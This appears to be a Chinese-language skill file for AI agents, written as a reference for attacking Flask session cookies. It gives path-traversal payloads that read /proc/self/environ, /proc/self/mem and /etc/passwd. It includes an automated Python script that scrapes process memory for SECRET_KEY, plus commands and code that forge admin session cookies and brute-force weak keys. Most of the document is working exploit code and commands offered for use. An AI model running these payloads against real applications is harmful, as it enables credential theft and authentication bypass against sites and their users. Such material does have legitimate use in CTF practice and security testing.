---
name: flask-session
description: Use when encountering Flask session伪造/破解 - SECRET_KEY泄露、session伪造、/proc/self利用
---

# Flask Session 攻击

## Info

- **Domain**: web
- **Tags**: web, python, flask, session, forgery

## 1. Flask Session 结构

Flask session 默认存储在用户 Cookie 中，结构为：

```
序列化内容.时间戳.防篡改签名
```

三部分以 `.` 分隔，使用 `SECRET_KEY` 签名。

## 2. SECRET_KEY 获取途径

### /proc/self/environ

```
# 当前进程环境变量（包含敏感信息）
?file=/proc/self/environ
# Docker 容器中 PID 1 就是主进程
?file=/proc/1/environ
```

### /proc/self/mem 内存读取

SECRET_KEY 必定存在于进程内存中，通过 `/proc/self/mem` 读取：

```
# Step 1: 获取内存映射
?file=/proc/self/maps
# 格式: 开始地址-结束地址 权限 偏移 设备 索引 文件路径
# 示例: 7f8a5b2c1000-7f8a5b2c3000 rw-p 00000000 00:00 0

# Step 2: 找到 rw-p 权限的地址段
# Step 3: 读取内存内容
?file=/proc/self/mem&start=7f8a5b2c1000&end=7f8a5b2c3000

# Step 4: 搜索 SECRET_KEY 特征
# 如格式: [a-z0-9]{32}*abcdefgh
```

### 自动化读取脚本

```python
import requests, re

url = "http://target/"
bypass = "../.."  # 路径穿越

# 获取内存映射
map_list = requests.get(f"{url}/info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")

for i in map_list:
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        if "*abcdefgh" in res.text:  # SECRET_KEY 特征
            secret_key = re.findall(r"[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Found:", secret_key[0])
                break
```

### 其他信息泄露路径

```
/proc/self/cmdline    # 进程启动参数（可读取源码路径）
/proc/self/environ    # 环境变量（数据库密码、API密钥、SECRET_KEY）
/etc/passwd           # 系统用户信息
```

## 3. Session 伪造

### 使用 flask-session-cookie-manager

```bash
# 编码（伪造 session）
python flask_session_cookie_manager3.py encode \
  -s "th3f1askisfunny" \
  -t "{'_fresh': True, '_user_id': '1', 'role': 'admin'}"

# 解码
python flask_session_cookie_manager3.py decode \
  -s "th3f1askisfunny" \
  -c ".eJwlzjsOwjAMANC7ZGaI48SOe5nK..."
```

### Python 代码伪造

```python
from flask.sessions import SecureCookieSessionInterface
import ast

class MockApp:
    def __init__(self, secret_key):
        self.secret_key = secret_key

def forge_session(secret_key, payload):
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.dumps(ast.literal_eval(payload))

# 使用
cookie = forge_session("SECRET_KEY", "{'user_id': '1', 'role': 'admin'}")
```

## 4. Session 破解

```bash
# 爆破 SECRET_KEY
flask-unsign --unsign \
  --cookie "eyJyb2xlIjoidXNlciIsInVzZXIiOiJndWVzdCJ9..." \
  --wordlist rockyou.txt \
  --no-literal-eval
```

## 5. 常见利用场景

```
1. 文件包含 → /proc/self/environ → SECRET_KEY → 伪造 admin session
2. 文件包含 → /proc/self/maps + /proc/self/mem → SECRET_KEY → 伪造 session
3. 弱 SECRET_KEY → flask-unsign 爆破 → 解码/编码 session
4. 泄露源码 → 发现 SECRET_KEY 生成规则 → 推导出密钥
```
